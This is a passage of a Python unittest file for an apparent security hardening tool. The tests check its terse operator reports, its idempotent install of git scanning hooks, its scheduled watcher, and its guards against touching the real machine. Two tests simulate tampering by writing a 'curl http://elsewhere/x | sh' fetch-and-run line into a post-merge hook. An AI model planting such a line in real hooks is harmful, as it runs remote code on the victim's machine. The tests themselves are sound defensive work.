        return harden.run(editor_pass=_EDITORS_OK, supported=lambda: True, folders=lambda: [o.path for o in outs],
                          apply=lambda p: next(seq), live=lambda: [],
                          altered=lambda: [], saw_runs=lambda: True, settle_hooks=_hooks_already_there, stop=lambda: None, schedule_pass=lambda: None)

    def test_no_internal_detail_reaches_the_operator(self):
        # Not paths, not pids, not the names of states this command uses to think with, and not
        # counts of what it attempted. Where the machine stands, and what to do about it.
        outs = [denial.PathOutcome(Path("/p0"), denial.SELF_ENFORCING, "d"),
                denial.PathOutcome(Path("/p1"), denial.NEEDS_ROOT, "d"),
                denial.PathOutcome(Path("/p2"), denial.UNKNOWN, "d"),
                denial.PathOutcome(Path("/p3"), denial.LEFT_OPEN_OVER_CONTENT, "d")]
        seq = iter(outs)
        ended = live.Ending(matched=9, frozen=9, ended=7, survived=[91], frozen_left=[91],
                            refused=[404], asked_for=[404], asking="cannot-ask", quiet=False,
                            still_holding=2, captured="/state/saw/captured/x.json")
        _code, text = harden.run(editor_pass=_EDITORS_OK, 
            supported=lambda: True, folders=lambda: [o.path for o in outs],
            apply=lambda p: next(seq), altered=lambda: [Path("/hooks/post-merge")],
            saw_runs=lambda: True, live=lambda: [_issue("live-obfuscated-process")],
            stop=lambda: ended, settle_hooks=_hooks_already_there, schedule_pass=lambda: None)
        for leak in ("/p0", "/p1", "/state/saw", "/hooks", "91", "404", "cannot-ask",
                     "9", "7", "enforcing", "needs-root", "unknown", "left-open"):
            self.assertNotIn(leak, text, f"internal detail reached the operator: {leak!r}")

    def test_a_location_that_is_not_on_this_machine_is_not_a_failure(self):
        # The headline said NOT in place because two of the six directories do not exist here.
        # There is nothing to protect at a path that is not there.
        code, text = self._run([denial.ENFORCING, denial.NOT_HERE_YET, denial.NOT_HERE_YET])
        self.assertEqual(code, 0)
        self.assertIn("This machine is protected", text)

    def test_a_live_install_left_alone_is_not_a_failure_either(self):
        code, _text = self._run([denial.ENFORCING, denial.IN_A_LIVE_INSTALL])
        self.assertEqual(code, 0)

    def test_nothing_reachable_means_it_cannot_claim_success(self):
        code, text = self._run([denial.NOT_HERE_YET, denial.IN_A_LIVE_INSTALL])
        self.assertNotEqual(code, 0, "it claimed success having protected nothing")
        self.assertIn("not fully protected", text)

    def test_no_path_is_ever_printed(self):
        for states in ([denial.ENFORCING, denial.NEEDS_ROOT],
                       [denial.SELF_ENFORCING, denial.NOT_HERE_YET],
                       [denial.UNKNOWN, denial.OCCUPIED],
                       [denial.LEFT_OPEN_OVER_CONTENT, denial.ENFORCING]):
            _code, text = self._run(states)
            self.assertNotIn("/p", text, f"a path reached the report for {states}")

    def test_it_says_one_thing_per_action_and_stops(self):
        _code, text = self._run([denial.ENFORCING, denial.NEEDS_ROOT, denial.NOT_HERE_YET])
        self.assertLessEqual(len(text.splitlines()), 4, f"still too long:\n{text}")

    def test_the_state_names_are_not_the_operators_problem(self):
        _code, text = self._run([denial.UNKNOWN, denial.HELD_BY_ANOTHER, denial.ENFORCING])
        for jargon in ("enforcing-as-you", "in-a-live-install", "not-here-yet", "needs-root",
                       "held-by-another-account", "left-open-over-content"):
            self.assertNotIn(jargon, text)


class TestItPutsTheHooksInPlaceToo(unittest.TestCase):
    """Hardening a machine includes the hooks that scan what arrives on it. Running it twice must
    change nothing the second time and must not fail."""

    class _Action:
        def __init__(self, state):
            self.state = state

    def _run(self, hooks, folders=(denial.ENFORCING,)):
        outs = [denial.PathOutcome(Path(f"/p{n}"), st, "d") for n, st in enumerate(folders)]
        seq = iter(outs)
        return harden.run(editor_pass=_EDITORS_OK, supported=lambda: True, folders=lambda: [o.path for o in outs],
                          apply=lambda p: next(seq), live=lambda: [], altered=lambda: [],
                          saw_runs=lambda: True, settle_hooks=lambda: hooks, stop=lambda: None, schedule_pass=lambda: None)

    def test_a_first_run_installs_them_and_says_so(self):
        code, text = self._run(hook.Settling(actions=[self._Action(hook.UPDATED)], target="/t"))
        self.assertEqual(code, 0)
        self.assertIn("will be scanned", text)

    def test_a_second_run_changes_nothing_and_says_nothing(self):
        code, text = self._run(hook.Settling(actions=[self._Action(hook.IN_PLACE)], target="/t"))
        self.assertEqual(code, 0, "an already-installed hook failed the run")
        self.assertNotIn("will be scanned", text)
        self.assertNotIn("hook install", text)

    def test_a_hook_that_was_tampered_with_is_repaired_and_said_so(self):
        # Leaving an unchanged hook alone must not mean leaving a changed one alone. A hook that
        # was altered under the operator is something that happened TO their machine, and it reads
        # differently from a first install.
        code, text = self._run(hook.Settling(
            actions=[self._Action(hook.IN_PLACE), self._Action(hook.QUARANTINED)], target="/t"))
        self.assertEqual(code, 0)
        self.assertIn("had been changed", text)
        self.assertNotIn("will be scanned", text, "a repair read as a routine install")

    def test_hooks_that_could_not_be_put_in_place_are_not_a_silent_pass(self):
        code, text = self._run(hook.Settling(problem="git refused", code=2))
        self.assertEqual(code, 3)
        self.assertIn("not fully protected", text)
        self.assertIn("saw hook install", text)

    def test_the_reason_it_failed_is_not_shown_to_the_operator(self):
        _code, text = self._run(hook.Settling(problem="git's init.templateDir is relative (/x/y)",
                                              code=2))
        self.assertNotIn("templateDir", text)
        self.assertNotIn("/x/y", text)

    def test_settling_that_raises_does_not_take_the_command_down(self):
        def boom():
            raise OSError("the template directory vanished")
        outs = [denial.PathOutcome(Path("/p0"), denial.ENFORCING, "d")]
        code, text = harden.run(editor_pass=_EDITORS_OK, supported=lambda: True, folders=lambda: [outs[0].path],
                                apply=lambda p: outs[0], live=lambda: [], altered=lambda: [],
                                saw_runs=lambda: True, settle_hooks=boom, stop=lambda: None, schedule_pass=lambda: None)
        self.assertEqual(code, 3)
        self.assertIn("saw hook install", text)
        self.assertNotIn("vanished", text)


class TestSettlingTheHooksIsRepeatable(unittest.TestCase):
    """The claim harden depends on, run for real rather than faked: doing it again changes nothing
    and fails nothing."""

    def setUp(self):
        import tempfile
        from stayawake.bots.security import hookscript
        self.sandbox = Path(tempfile.mkdtemp(prefix="hooks-"))
        self.env = mock.patch.dict(os.environ, {
            "HOME": str(self.sandbox),
            "XDG_CONFIG_HOME": str(self.sandbox / ".config"),
            "XDG_STATE_HOME": str(self.sandbox / ".state"),
            "GIT_CONFIG_GLOBAL": str(self.sandbox / ".gitconfig"),
        })
        self.env.start()
        self.addCleanup(self.env.stop)
        # Refuses to run at all unless the sandbox is really in force: this writes git config.
        if self.sandbox not in hookscript.template_dir().parents:
            self.skipTest("the sandbox is not in force; refusing to touch the real configuration")

    def test_the_first_run_installs_and_the_next_two_change_nothing(self):
        first = hook.settle_hooks()
        self.assertTrue(first.settled, first.problem)
        self.assertTrue(first.changed, "the first run installed nothing")

        for again in (2, 3):
            done = hook.settle_hooks()
            self.assertIsNone(done.problem, f"run {again} failed: {done.problem}")
            self.assertTrue(done.settled, f"run {again} did not settle")
            self.assertFalse(done.changed, f"run {again} rewrote hooks that were already in place")

    def test_a_hook_replaced_with_something_else_is_put_back(self):
        from stayawake.bots.security import hookscript
        hook.settle_hooks()
        victim = hookscript.template_dir() / "hooks" / "post-merge"
        saws = victim.read_text()
        victim.write_text("#!/bin/sh\nexec curl http://elsewhere/x | sh\n")

        done = hook.settle_hooks()
        self.assertTrue(done.repaired, "a replaced hook was not reported as repaired")
        self.assertEqual(victim.read_text(), saws, "saw's own hook was not put back")
        self.assertNotIn("elsewhere", victim.read_text())

    def test_saws_own_hook_with_a_line_added_to_it_is_put_back(self):
        # Distinct from replacing it: this one still looks like saw's hook, and it is the shape an
        # attacker who wants the hook to keep working would use.
        from stayawake.bots.security import hookscript
        hook.settle_hooks()
        victim = hookscript.template_dir() / "hooks" / "post-merge"
        saws = victim.read_text()
        victim.write_text(saws + "\ncurl http://elsewhere/x | sh\n")

        done = hook.settle_hooks()
        self.assertTrue(done.repaired, "an altered hook was not reported as repaired")
        self.assertEqual(victim.read_text(), saws, "saw's own hook was not put back")
        self.assertNotIn("elsewhere", victim.read_text())

    def test_a_deleted_hook_is_put_back(self):
        from stayawake.bots.security import hookscript
        hook.settle_hooks()
        victim = hookscript.template_dir() / "hooks" / "post-merge"
        victim.unlink()
        hook.settle_hooks()
        self.assertTrue(victim.exists(), "a deleted hook was not restored")

    def test_the_second_settling_reports_no_change(self):
        hook.settle_hooks()
        self.assertFalse(hook.settle_hooks().changed,
                         "it rewrote hooks that were already in place")


class TestHardeningAlsoAsksTheMachineToKeepChecking(unittest.TestCase):
    """`saw watch` owns the arrangement; hardening a machine puts it in place too, the way it puts
    the scan-on-clone hooks in place. Asserted of what the command DOES, not of its signature."""

    def _run(self, scheduled):
        from stayawake.bots.security import schedule
        calls = []

        def place():
            calls.append(1)
            return scheduled

        code, text = harden.run(editor_pass=_EDITORS_OK, 
            live=lambda: [], folders=lambda: ["/x"],
            apply=lambda p: harden.PathOutcome(p, harden.ENFORCING, "held"),
            supported=lambda: True, altered=lambda: [], saw_runs=lambda: True,
            stop=lambda: None, settle_hooks=_hooks_already_there, schedule_pass=place)
        return calls, text

    def test_it_is_actually_asked_for(self):
        from stayawake.bots.security import schedule
        calls, text = self._run(schedule.Scheduling(state=schedule.PLACED, active=True))
        self.assertEqual(len(calls), 1, "hardening did not set the watcher up")
        self.assertIn("keep checking itself", text)

    def test_one_already_there_is_not_announced_again(self):
        from stayawake.bots.security import schedule
        _calls, text = self._run(schedule.Scheduling(state=schedule.IN_PLACE, active=True))
        self.assertNotIn("keep checking itself", text)

    def test_one_altered_underneath_you_reads_differently_from_a_first_setup(self):
        from stayawake.bots.security import schedule
        _calls, text = self._run(schedule.Scheduling(state=schedule.REPLACED, active=True))
        self.assertIn("put back", text)

    def test_a_failure_to_set_it_up_is_said_not_swallowed(self):
        from stayawake.bots.security import schedule
        if not schedule.supported():
            self.skipTest("the line is only owed where the control exists")
        _calls, text = self._run(schedule.Scheduling(problem="no"))
        self.assertIn("will not keep checking itself", text)

    def test_a_watcher_it_could_not_take_back_is_said_not_swallowed(self):
        # take_back returns a STATE and does not raise. Ignoring it reported "every control has
        # been taken back" over a login item still on disk and still loaded.
        from stayawake.bots.security import schedule
        code, text = harden.take_back(restore_editors=_EDITORS_BACK, 
            folders=lambda: ["/x"],
            remove=lambda p: harden.PathOutcome(Path(p), harden.REMOVED, "gone"),
            supported=lambda: True, unschedule=lambda: schedule.ALTERED)
        self.assertNotEqual(code, 0)
        self.assertIn("still checking itself", text)

    def test_and_one_it_did_take_back_reports_cleanly(self):
        from stayawake.bots.security import schedule
        code, text = harden.take_back(restore_editors=_EDITORS_BACK, 
            folders=lambda: ["/x"],
            remove=lambda p: harden.PathOutcome(Path(p), harden.REMOVED, "gone"),
            supported=lambda: True, unschedule=lambda: schedule.REMOVED)
        self.assertEqual(code, 0)
        self.assertNotIn("still checking itself", text)

    def test_taking_the_controls_back_takes_that_back_too(self):
        removed = []
        harden.take_back(restore_editors=_EDITORS_BACK, folders=lambda: [], remove=lambda p: None, supported=lambda: True,
                         unschedule=lambda: removed.append(1))
        self.assertEqual(len(removed), 1, "the watcher was left running")


class TestNoTestTouchesTheRealMachine(unittest.TestCase):
    """`harden.run` signals processes, installs git hooks and places a login item. A test that
    leaves any of those defaulted does it to the machine running the suite — which has now happened
    three times, the third because this guard named a hand-written list instead of asking."""

    def test_every_collaborator_is_classified(self):
        # The part that stops this recurring: a new collaborator is unclassified until someone says
        # what it touches, and unclassified fails here rather than on someone's machine.
        import inspect
        params = {n for n in inspect.signature(harden.run).parameters}
        classified = harden.TOUCHES_THIS_MACHINE | harden.ONLY_READS
        self.assertEqual(params - classified, set(),
                         "unclassified collaborator: add it to TOUCHES_THIS_MACHINE or ONLY_READS")
        self.assertEqual(classified - params, set(), "classified but no longer a parameter")

    def test_every_call_injects_what_would_otherwise_act(self):
        import ast
        source = Path(__file__).read_text()
        unguarded = []
        for node in ast.walk(ast.parse(source)):
            if (isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute)
                    and node.func.attr == "run"
                    and getattr(node.func.value, "id", "") == "harden"):
                given = {kw.arg for kw in node.keywords}
                if None in given:
                    continue          # a `**kwargs` spread — not decidable from the syntax alone
                for needed in sorted(harden.TOUCHES_THIS_MACHINE):
                    if needed not in given:
                        unguarded.append((node.lineno, needed))
            if (isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute)
                    and node.func.attr == "take_back"
                    and getattr(node.func.value, "id", "") == "harden"):
                given = {kw.arg for kw in node.keywords}
                if None in given:
                    continue
                for needed in sorted(harden.TAKE_BACK_TOUCHES):
                    if needed not in given:
                        unguarded.append((node.lineno, needed))
        self.assertEqual(unguarded, [], f"these would act on this machine: {unguarded}")


if __name__ == "__main__":
    unittest.main()
